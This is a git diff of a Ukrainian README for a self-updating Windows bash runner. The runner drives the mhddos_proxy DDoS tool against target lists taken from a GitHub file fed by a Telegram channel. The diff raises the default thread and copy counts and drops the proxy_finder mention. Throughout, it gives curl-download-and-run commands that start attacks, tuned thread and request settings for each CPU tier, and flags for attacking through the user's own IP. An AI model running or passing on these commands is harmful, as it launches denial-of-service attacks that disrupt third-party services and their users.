@@ -1,7 +1,7 @@
 # Опис runner_for_windows
 
-runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Windows-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) та [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
-Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy та proxy_finder  
+runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Windows-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)  
+Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy  
 Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-2 (рандомно) хвилин), щоб дати машині трохи відпочити
 Скрипт розподіляє ваші машини по цілям: https://github.com/alexnest-ua/targets/blob/main/targets_linux (цілі беруться звідси: https://t.me/ddos_separ)  
   
@@ -45,7 +45,7 @@ runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює ці
 ```shell
 curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh
 ```
-* Буде запущено атаку з наступними параметрами за замовчуванням: num_of_copies=1 threads=2000 rpc=1000 debug="" vpn=""(1 список цілей, 2000 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР) та автоматично запустить паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
+* Буде запущено атаку з параметрами за замовчуванням в залежності від кількості ядер вашого ПК
 
 Тепер кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  
 
@@ -54,8 +54,8 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/r
 
 **!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 3)), але можно і без них:  
 `curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh [num_of_copies] [threads] [rpc] [debug] [vpn]`  
-- num_of_copies - кількість атакуємих списків цілей за один прохід (але не менше 1, та не більше 3, бо більше 3-ох знижує ефективність)
-- threads - кількість потоків (але не менше 1000, та не більше 2000 для одного ядра, 5000 для 2-4 ядер, 10000 для 4+ ядер)
+- num_of_copies - кількість копій атаки (але не менше 1, та не більше 4, бо більше 4-ох знижує ефективність)
+- threads - кількість потоків (але не менше 2500, та не більше 5000 для одного ядра, не більше 10000 для 2-4 ядер, не більше 15000 для 4+ ядер)
 - rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 3000)
 - debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
 - vpn - використання вашого ІР у атаці разом з проксі
@@ -66,7 +66,7 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/r
   
 * У всіх варіантах буде автоматично запущено паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
   
-1. ***Для лінивих*** (буде обрано за замовчуванням: num_of_copies=1 threads=2000 rpc=1000 debug="" vpn=""(1 список цілей, 2000 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР) та автоматично запустить паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder))
+1. ***Для лінивих*** (буде запущено з параметрами за замовчуванням в залежності від кількості ядер вашого ПК)  
 ```shell
 curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh
 ```
@@ -75,17 +75,17 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/r
   
 2. Слаба машина(1 CPU), саме ці параметри за замовчуванням:
 ```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2000 1000
+curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2500 1000
 ```
 
 3. Середня машина(2-4 CPUs):
 ```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 3500 2000
+curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 6000 2000
 ```
 
 4. Нормальна машина(4-8 CPUs):
 ```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 2 6500 2500
+curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 2 7500 2500
 ```
 
 5. Потужна машина(9+ CPUs):
@@ -95,9 +95,10 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/r
 
   
 *також ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ці.*  
+  
 *також можете додавати **4-тим** параметром --debug, що слідкувати за ходом атаки, та **5-тим** параметром --vpn, щоб атакувати ще й через свій ІР разом з проксі, наприклад:*  
 ```shell
-curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2000 1000 --debug --vpn
+curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2500 1000 --debug --vpn
 ```
   
 * Приклад **БЕЗ** параметру --debug:  
